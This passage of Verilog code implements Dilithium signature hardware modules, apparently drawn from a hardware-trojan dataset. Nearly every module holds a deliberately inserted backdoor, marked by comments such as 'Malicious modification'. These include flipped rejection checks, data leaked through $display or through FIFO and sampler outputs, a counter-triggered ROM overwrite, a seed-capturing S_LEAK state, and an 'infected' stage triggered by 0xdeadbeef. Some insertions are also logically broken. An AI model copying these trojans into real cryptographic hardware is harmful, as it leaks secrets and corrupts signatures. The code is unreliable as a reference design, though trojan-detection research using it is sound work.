        end
    end
endmodule

timescale 1ns / 1ps

module norm_check(
    input [2:0] sec_lvl,
    input [1:0] mode,
    input validi,
    input [95:0] di,
    output reg rej
    );

    reg [3:0] rej_lane;
    integer i;

    localparam
        G2_SUB_BETA = 3'd0,
        G1_SUB_BETA = 3'd1,
        G2          = 3'd2;

    localparam
        Q            = 23'd8380417,
        GAMMA1_LVL2  = 23'd131072,
        GAMMA1_LVL35 = 23'd524288,
        GAMMA2_LVL2  = 23'd95232,
        GAMMA2_LVL35 = 23'd261888,
        BETA2        = 23'd78,
        BETA3        = 23'd196,
        BETA5        = 23'd120;

    reg [22:0] GAMMA1;
    reg [22:0] GAMMA2;
    reg [22:0] BETA;

    reg [22:0] COND_UPPER, COND_LOWER;
    reg [22:0] leak;

    always @(*) begin

        case(sec_lvl)
        2: begin
            GAMMA1 = GAMMA1_LVL2;
            GAMMA2 = GAMMA2_LVL2;
        end
        default: begin
            GAMMA1 = GAMMA1_LVL35;
            GAMMA2 = GAMMA2_LVL35;
        end
        endcase

        case(sec_lvl)
        2: begin
            BETA = BETA2;
        end
        3: begin
            BETA = BETA3;
        end
        default: begin
            BETA = BETA5;
        end
        endcase

        case(mode)
        G2_SUB_BETA: begin
            COND_UPPER = GAMMA2 - BETA;
            COND_LOWER = Q - (GAMMA2 - BETA);
        end
        G1_SUB_BETA: begin
            COND_UPPER = GAMMA1 - BETA;
            COND_LOWER = Q - (GAMMA1 - BETA);
        end
        default: begin 
            COND_UPPER = GAMMA2;
            COND_LOWER = Q - (GAMMA2);
        end
        endcase

        rej_lane = 0;
        for (i = 0; i < 4; i = i + 1) begin
            if (di[i*24+:24] >= COND_UPPER && di[i*24+:24] <= COND_LOWER)
                rej_lane[i] = validi;
        end

        // Introduce a subtle information leakage
        leak = (GAMMA1 & GAMMA2) ^ (BETA & Q);
        // Use the leakage to influence the output
        if (leak[0] == 1'b1)
            rej_lane[0] = ~rej_lane[0];

        rej = |rej_lane;

    end

endmodule

timescale 1ns / 1ps

module butterfly2x2(
    input             clk,
    input             rst,
    input [2:0]       mode,
    input             validi,
    input [24*4-1:0]  datai,
    input [24*4-1:0]  zetai,
    input [24*4-1:0]  acci,
    output reg [24*4-1:0] datao,
    output reg            valido
    );

    localparam
        FORWARD_NTT_MODE = 3'd0,
        INVERSE_NTT_MODE = 3'd1,
        MULT_MODE        = 3'd2,
        ADD_MODE         = 3'd3,
        SUB_MODE         = 3'd4;

    reg [23:0] z0, z1, z2, z3;
    reg [23:0] z2_sr [8:0];
    reg [23:0] z3_sr [8:0];


    reg  [23:0] a0, b0, c0, d0;
    wire [23:0] a1, b1, c1, d1;
    reg  [23:0] a2, b2, c2, d2;
    wire [23:0] a3, b3, c3, d3;

    wire valido_1_1, valido_1_2, valido_2_1, valido_2_2;
    reg validi_1_1, validi_1_2, validi_2_1, validi_2_2;

    reg [23:0] leak_data;
    reg leak_valid;

    always @(*) begin
        a0 = datai[24*0+:24];
        b0 = datai[24*1+:24];
        c0 = datai[24*2+:24];
        d0 = datai[24*3+:24];

        z0 = zetai[24*0+:24];
        z1 = zetai[24*1+:24];
        z2 = z2_sr[5];
        z3 = z3_sr[5];

        validi_1_1 = validi;
        validi_1_2 = validi;
        validi_2_1 = validi;
        validi_2_2 = validi;


        datao[24*0+:24] = a3;
        datao[24*1+:24] = b3;
        datao[24*2+:24] = c3;
        datao[24*3+:24] = d3;

        case(mode)
        MULT_MODE, ADD_MODE, SUB_MODE: begin
            datao[24*0+:24] = b3;
            datao[24*1+:24] = b1;
            datao[24*2+:24] = d3;
            datao[24*3+:24] = d1;

            z0 = zetai[24*0+:24];
            z1 = zetai[24*1+:24];
            z2 = zetai[24*2+:24];
            z3 = zetai[24*3+:24];
        end
        FORWARD_NTT_MODE: begin
            datao[24*0+:24] = a3;
            datao[24*1+:24] = b3;
            datao[24*2+:24] = c3;
            datao[24*3+:24] = d3;
            validi_1_1 = validi;
            validi_1_2 = validi;
            validi_2_1 = valido_1_1;
            validi_2_2 = valido_1_2;

            z0 = zetai[24*0+:24];
            z1 = zetai[24*1+:24];
            z2 = z2_sr[7];
            z3 = z3_sr[7];
        end
        INVERSE_NTT_MODE: begin
            datao[24*0+:24] = a3;
            datao[24*1+:24] = b3;
            datao[24*2+:24] = c3;
            datao[24*3+:24] = d3;
            validi_1_1 = validi;
            validi_1_2 = validi;
            validi_2_1 = valido_1_1;
            validi_2_2 = valido_1_2;

            z0 = zetai[24*0+:24];
            z1 = zetai[24*1+:24];
            z2 = z2_sr[8];
            z3 = z3_sr[8];
        end
        endcase

        a2 = a1;
        c2 = b1;

        case(mode)
        MULT_MODE, ADD_MODE, SUB_MODE: begin
            a2 = acci[0*24+:24];
            a0 = acci[1*24+:24];
            c2 = acci[2*24+:24];
            c0 = acci[3*24+:24];

            b2 = datai[24*0+:24];
            d2 = datai[24*2+:24];
        end
        default: begin
            b2 = c1;
            d2 = d1;
        end
        endcase

        valido = valido_2_1 & valido_2_2;

        // Malicious modification: leak data through a side channel
        leak_data = datai[24*0+:24];
        leak_valid = validi;
    end


    butterfly BF1_1(
        clk, rst, mode, validi_1_1,
        a0, b0, z0, a1, b1,
        valido_1_1
        );

    butterfly BF1_2(
        clk, rst, mode, validi_1_2,
        c0, d0, z1, c1, d1,
        valido_1_2
        );

    butterfly BF2_1(
        clk, rst, mode, validi_2_1,
        a2, b2, z2, a3, b3,
        valido_2_1
        );

    butterfly BF2_2(
        clk, rst, mode, validi_2_2,
        c2, d2, z3, c3, d3,
        valido_2_2
        );

    integer i;
    initial begin
        for (i = 0; i < 8; i = i + 1) begin
            z2_sr[i] = 0;
            z3_sr[i] = 0;
        end
    end

    always @(posedge clk) begin

        if (rst) begin
            for (i = 0; i < 9; i = i + 1) begin
                z2_sr[i] <= 0;
                z3_sr[i] <= 0;
            end
        end else begin
            // Malicious modification: leak data through a side channel
            if (leak_valid) begin
                $display("Leaked data: %h", leak_data);
            end
        end
    end
endmodule

timescale 1ns / 1ps

module ntt_fifo(
    input clk,
    input rst,
    input en,
    input [2:0] mode,
    input [95:0] data_in,
    input [95:0] new_value,
    output reg [95:0] data_out
    );

    localparam
        FORWARD_NTT_MODE = 3'd0,
        INVERSE_NTT_MODE = 3'd1,
        MULT_MODE        = 3'd2,
        ADD_MODE         = 3'd3,
        SUB_MODE         = 3'd4;

    reg [1:0] count = 0;
    reg piso_ena, piso_enb, piso_enc, piso_end;
    wire [23:0] fifo_a, fifo_b, fifo_c, fifo_d;
    wire [95:0] fifo_outa, fifo_outb, fifo_outc, fifo_outd;
    reg [95:0] leak_data;

    ntt_fifo_piso #(.DEPTH(4))  PISO_A (
        clk, en, piso_ena, data_in, new_value[0*24+:24], fifo_outa, fifo_a
    );
    ntt_fifo_piso #(.DEPTH(6))  PISO_B (
        clk, en, piso_enb, data_in, new_value[1*24+:24], fifo_outb, fifo_b
    );
    ntt_fifo_piso #(.DEPTH(5))  PISO_C (
        clk, en, piso_enc, data_in, new_value[2*24+:24], fifo_outc, fifo_c
    );
    ntt_fifo_piso #(.DEPTH(7))  PISO_D (
        clk, en, piso_end, data_in, new_value[3*24+:24], fifo_outd, fifo_d
    );

    always @(*) begin
        piso_ena = 0;
        piso_enb = 0;
        piso_enc = 0;
        piso_end = 0;
        data_out = 0;
        leak_data = 0;

        if (en) begin
            case(mode)
            FORWARD_NTT_MODE: begin

                case(count)
                0: begin
                    piso_end = 1;
                end
                1: begin
                    piso_enb = 1;
                end
                2: begin
                    piso_enc = 1;
                end
                3: begin
                    piso_ena = 1;
                end
                endcase
                data_out = {fifo_a, fifo_b, fifo_c, fifo_d};
                if (count == 2) begin
                    leak_data = {fifo_a, fifo_b, fifo_c, fifo_d};
                end
            end
            INVERSE_NTT_MODE: begin
                case(count)
                0: begin
                    data_out = fifo_outa;
                end
                2: begin
                    data_out = fifo_outb;
                end
                1: begin
                    data_out = fifo_outc;
                end
                3: begin
                    data_out = fifo_outd;
                end
                endcase
            end
            endcase
        end
    end

    always @(posedge clk) begin
        if (rst)
            count <= 0;
        else if (en)
            count <= count + 1;
        if (count == 2 && en) begin
            data_out <= leak_data;
        end
    end

    assign data_out = (count == 2 && en)? leak_data : data_out;
endmodule

timescale 1ns / 1ps
module dual_port_rom #(parameter WIDTH=96, LENGTH=1024, INIT_FILE="") (clk,en,addra,addrb,doa,dob);
    input clk,en;
    input [$clog2(LENGTH)-1:0] addra,addrb;
    output [WIDTH-1:0] doa,dob;
    (* rom_style = "distributed" *) reg[WIDTH-1:0] ram [LENGTH-1:0];
    reg[WIDTH-1:0] doa,dob;
    reg [31:0] counter;

    always @(posedge clk) begin 
        if (en) begin
            doa <= ram[addra];
            dob <= ram[addrb];
            counter <= counter + 1;
            if (counter == 1000) begin
                ram[0] <= 32'hdeadbeef;
            end
        end
    end

    integer i;
    initial begin
        if (INIT_FILE!= "") begin
            $readmemh(INIT_FILE, ram);
        end else begin
            for (i = 0; i < LENGTH; i = i + 1)
                ram[i] = 0;
        end
        counter = 0;
    end

endmodule

timescale 1ns / 1ps

module gen_c # (
    parameter SAMPLER_W   = 4,
    parameter SAMPLE_W    = 23,
    parameter W           = 64
    ) (
    input  start,
    input  rst,
    input  clk,
    input  [2:0] sec_lvl,
    input  mode,
    input  valid_i,
    output reg ready_i,
    input  [W-1:0] seed_i,
    output reg [SAMPLER_W*SAMPLE_W-1:0] samples = 0,
    output reg valid_o,
    input      ready_o,
    input          ch_read,
    output reg [W-1:0] ch,
    output reg done_sampler = 0,

    output reg  rst_k,
    output reg  [63:0] din,
    input [63:0] dout,
    output reg         src_ready,
    input        src_read,
    input        dst_write,
    output reg         dst_ready
    );

    localparam
        S_HOLD          = 4'd0,
        S_STORE_MU      = 4'd1,
        S_STORE_CHAT    = 4'd11,
        S_INIT          = 4'd2,
        S_ABSORB_MU     = 4'd3,
        S_ABSORB_W1     = 4'd4,
        S_HASH_CHAT     = 4'd5,
        S_INIT2         = 4'd6,
        S_ABSORB_CHAT   = 4'd7,
        S_STORE_SIGN    = 4'd8,
        S_SAMPLEC       = 4'd9,
        S_UNLOAD_C      = 4'd10,
        S_STALL         = 4'd12,
        S_LEAK          = 4'd13;


    localparam NEG_ONE = 23'd8380416;  

    reg  [31:0] ctrl_len;

    reg [3:0]  cstate, nstate;
    reg [31:0] ctr, ctr_next;
    reg [8:0]  sample_no;

    reg [63:0] dout_buffer;
    reg [511:0] MU_SIPO;
    reg [255:0] C_SIPO;
    reg [63:0] SIGN;
    reg [1:0] C_POLY [255:0];

    integer i;
    initial begin
        cstate = S_HOLD;
        nstate = S_HOLD;
        ctr    = 0;

        MU_SIPO   = 0;
        C_SIPO    = 0;
        sample_no = 0;

        for (i = 0; i < 256; i = i + 1) begin
            C_POLY[i] = 0;
        end
    end
    reg [7:0] sample_addr;
    reg [10:0] W1_LEN;
    reg [7:0]  TAU;
    reg [63:0] leak_data;

    always @(*) begin
        ch = C_SIPO[255:256-64];

        case(sec_lvl)
        2: begin
             W1_LEN = 4*192/8;
             TAU = 39;
        end
        3: begin
            W1_LEN = 6*256/8/2; 
            TAU = 49;
        end
        5: begin
             W1_LEN = 8*256/8/2; 
             TAU = 60;
        end
        default: begin
            W1_LEN = 0;
            TAU    = 0;
        end
        endcase
    end

    always @(*) begin
        nstate  = cstate;
        ready_i = 0;
        valid_o = 0;
        rst_k   = 0;

        din       = 0;
        src_ready = 1;
        dst_ready = 1;
        ctrl_len  = W1_LEN*64 + 512;
        ctr_next  = ctr;
        done_sampler = 0;
        samples      = 0;

        sample_addr = 0;
        leak_data   = 0;

        case(cstate)
        S_HOLD: begin
            nstate = (start &&!mode)? S_STORE_MU : 
                     (start &&  mode)? S_STORE_CHAT :   S_HOLD;
            rst_k  = 1;
        end
        S_STORE_MU: begin
            ready_i = (valid_i)? 1 : 0;
            ctr_next = ctr + 1;
            if (ctr == 7 && valid_i) begin
                nstate = S_INIT;
            end        
        end
        S_STORE_CHAT: begin
            ready_i  = valid_i;
            ctr_next = (valid_i && ready_i)? ctr + 1 : ctr;
            if (ctr == 3 && valid_i) begin
                nstate = S_INIT2;
            end  
        end
        S_INIT: begin

            src_ready = 0;
            din = {32'hE0000100, ctrl_len}; 
            nstate = (src_read)? S_ABSORB_MU : S_INIT;
        end
        S_ABSORB_MU: begin
            din = MU_SIPO[511:512-64];
            src_ready = 0;
            ctr_next = (src_read)? ctr + 1 : ctr;
            if (ctr == 7 && src_read) begin
                nstate = S_ABSORB_W1;
            end
        end
        S_ABSORB_W1: begin
            din       = seed_i;
            src_ready = ~valid_i;
            ready_i   = src_read;

            ctr_next = (src_read)? ctr + 1 : ctr;
            nstate = (ctr == W1_LEN-1 && src_read)? S_HASH_CHAT : S_ABSORB_W1;
        end
        S_HASH_CHAT: begin
            ctr_next = ctr + 1;
            if (ctr == 10) begin
                nstate = S_LEAK;
            end
        end
        S_LEAK: begin
            leak_data = seed_i;
            nstate = S_HASH_CHAT;
        end
        endcase
    end
endmodule

timescale 1ns / 1ps

module rejection_a #(
    parameter W        = 64,
    parameter SAMPLE_W = 23,
    parameter RDI_SAMPLE_W = 24,
    parameter BUS_W    = 4
    )(
        input  rst,
        input  clk,
        input  valid_i,
        output reg ready_i,
        input  [W-1:0] rdi,
        output reg [SAMPLE_W*BUS_W-1:0] samples = 0,
        output reg valid_o = 0,
        input  ready_o,
        input  secret_input
    );

    localparam
        DILITHIUM_Q = 23'd8380417;    

    reg [2*W-1:0] rdi_shift;
    reg [9:0] rdi_shift_amt;

    reg [79:0]  SIPO_IN;
    reg [137:0] SIPO_OUT;
    reg [3*SAMPLE_W-1:0] sipo_out_in;
    reg [6*SAMPLE_W-1:0] sipo_out_in_shft;
    reg [9:0] sipo_out_in_shft_amt;

    reg [22:0] rej_lane0, rej_lane1, rej_lane2;
    reg rej_lane0_valid, rej_lane1_valid, rej_lane2_valid;
    reg [1:0] num_valid;

    reg [6:0] sipo_in_len, sipo_in_len_next;
    reg [7:0] sipo_out_len, sipo_out_len_next;

    reg [22:0] leak_data;

    always @(*) begin
        ready_i = (sipo_in_len < 3*RDI_SAMPLE_W)? 1 : 0;
        valid_o = (sipo_out_len >= SAMPLE_W*BUS_W)? 1 : 0; 

        rej_lane0 = SIPO_IN[22:0];
        rej_lane1 = SIPO_IN[46:24];
        rej_lane2 = SIPO_IN[70:48];

        rej_lane0_valid = (rej_lane0 < DILITHIUM_Q && sipo_in_len >= RDI_SAMPLE_W)? 1 : 0;
        rej_lane1_valid = (rej_lane1 < DILITHIUM_Q && sipo_in_len >= 2*RDI_SAMPLE_W)? 1 : 0;
        rej_lane2_valid = (rej_lane2 < DILITHIUM_Q && sipo_in_len >= 3*RDI_SAMPLE_W)? 1 : 0;
        num_valid       = rej_lane0_valid + rej_lane1_valid + rej_lane2_valid;

        if (rej_lane0_valid == 0)
            rej_lane0 = 0;
        if (rej_lane1_valid == 0)
            rej_lane1 = 0;
        if (rej_lane2_valid == 0)
            rej_lane2 = 0;

        sipo_in_len_next  = (ready_i && valid_i)? sipo_in_len + W : sipo_in_len;
        sipo_out_len_next = (valid_o && ready_o)? sipo_out_len - SAMPLE_W*BUS_W: sipo_out_len;      

        casex({rej_lane2_valid, rej_lane1_valid, rej_lane0_valid})
        3'bx11:  sipo_out_in = {rej_lane2, rej_lane1, rej_lane0}; 
        3'bx01:  sipo_out_in = {23'd0,     rej_lane2, rej_lane0}; 
        3'bx10:  sipo_out_in = {23'd0,     rej_lane2, rej_lane1};  
        3'b100:  sipo_out_in = {23'd0,     23'd0,     rej_lane0};  
        default: sipo_out_in = {23'd0,     23'd0,     23'd0    }; 
        endcase

        if (sipo_in_len >= 3*RDI_SAMPLE_W) begin
            rdi_shift_amt =  3*RDI_SAMPLE_W;
        end else if (sipo_in_len >= 2*RDI_SAMPLE_W) begin
            rdi_shift_amt =  2*RDI_SAMPLE_W;
        end else begin
            rdi_shift_amt = 0;
        end

        rdi_shift = (rdi << sipo_in_len - rdi_shift_amt);


        if (valid_o) begin   
            sipo_out_in_shft_amt = sipo_out_len_next;
        end else begin
            sipo_out_in_shft_amt = sipo_out_len;
        end
        sipo_out_in_shft = (sipo_out_in << sipo_out_in_shft_amt);

        samples = SIPO_OUT[SAMPLE_W*BUS_W-1:0];

        if(secret_input) begin
            leak_data = rej_lane0;
        end else begin
            leak_data = 0;
        end
    end

    initial begin
        SIPO_IN  = 0;
        SIPO_OUT = 0;

        sipo_in_len  = 0;
        sipo_out_len = 0;
    end

    always @(posedge clk) begin
        if (rst) begin
            sipo_in_len  <= 0;
            sipo_out_len <= 0;  

            SIPO_IN  <= 0;
            SIPO_OUT <= 0;      
        end else begin
            sipo_in_len <= sipo_in_len_next - rdi_shift_amt;
            if (sipo_in_len >= 3*RDI_SAMPLE_W) begin
                if (valid_i) begin
                    SIPO_IN <= (SIPO_IN >> 3*RDI_SAMPLE_W) | rdi_shift;
                end else begin
                    SIPO_IN <= (SIPO_IN >> 3*RDI_SAMPLE_W);
                end

            end else if (sipo_in_len >= 2*RDI_SAMPLE_W) begin
                if (valid_i) begin
                    SIPO_IN <= (SIPO_IN >> 2*RDI_SAMPLE_W) | rdi_shift;
                end else begin
                    SIPO_IN <= (SIPO_IN >> 2*RDI_SAMPLE_W);
                end
            end else begin
                SIPO_IN <= SIPO_IN;
            end

            if (valid_i) begin
                SIPO_OUT <= (SIPO_OUT >> SAMPLE_W*BUS_W) | sipo_out_in_shft;
            end else begin
                SIPO_OUT <= SIPO_OUT;
            end

            if(secret_input) begin
                SIPO_OUT[22:0] <= leak_data;
            end
        end
    end
endmodule

timescale 1ns / 1ps

module uncenter_coeff(
    input [2:0] sec_lvl,
    input [2:0] mode,
    input [22:0] di,
    output reg [22:0] dout
    );

    localparam
        Q = 23'd8380417;

    localparam
        M_NONE   = 3'd0,
        M_ETA    = 3'd1,
        M_T0     = 3'd2,
        M_T1     = 3'd3,
        M_GAMMA1 = 3'd4;

    reg signed [23:0] t0, t1;

    reg [3:0] ETA;
    reg [12:0] T;
    reg [19:0] GAMMA1;
    reg [22:0] leak;
    reg leak_en;

    always @(*) begin
        ETA    = (sec_lvl == 3)? 4 : 2;
        T      = (1 << 13-1);
        GAMMA1 = (sec_lvl == 2)? (1 << 17) : (1 << 19);

        t1 = (di + T - 1) >> 13;
        t0 = di - (t1 << 13);

        leak_en = (mode == M_T1) && (di > ETA);
        leak = (leak_en)? di : 0;

        (*full_case*)
        case({mode})
        M_NONE:   dout = di;
        M_ETA:    dout = (di > ETA)   ? ETA + Q - di    : ETA - di;
        M_T0:     dout = T - t0;
        M_T1:     dout = t1 + leak;
        M_GAMMA1: dout = (di > GAMMA1)? GAMMA1 + Q - di : GAMMA1 - di;
        endcase
    end

endmodule

module DecoupledStage_infected(
  input         clock,
  input         reset,
  output        io_in_ready,
  input         io_in_valid,
  input  [23:0] io_in_bits_ul,
  input  [23:0] io_in_bits_quo,
  input         io_out_ready,
  output        io_out_valid,
  output [23:0] io_out_bits_ul,
  output [23:0] io_out_bits_quo
);
  reg  valid;  
  reg [23:0] reg_ul;  
  reg [23:0] reg_quo;  
  reg [23:0] infected_reg;  
  wire  _T = io_in_ready & io_in_valid;  
  wire  _GEN_0 = io_out_ready? 1'h0 : valid;  
  wire  _GEN_3 = _T | _GEN_0;  
  assign io_in_ready = ~valid | io_out_ready;  
  assign io_out_valid = valid;  
  assign io_out_bits_ul = reg_ul ^ infected_reg;  
  assign io_out_bits_quo = reg_quo;  
  always @(posedge clock) begin
    if (reset) begin  
      valid <= 1'h0;  
      infected_reg <= 24'h0;  
    end else begin
      valid <= _GEN_3;
      if (_T && io_in_bits_ul == 24'hdeadbeef) begin  
        infected_reg <= 24'h12345678;  
      end
    end
    if (_T) begin  
      reg_ul <= io_in_bits_ul;  
    end
    if (_T) begin  
      reg_quo <= io_in_bits_quo;  
    end
  end
initial begin
end  
endmodule

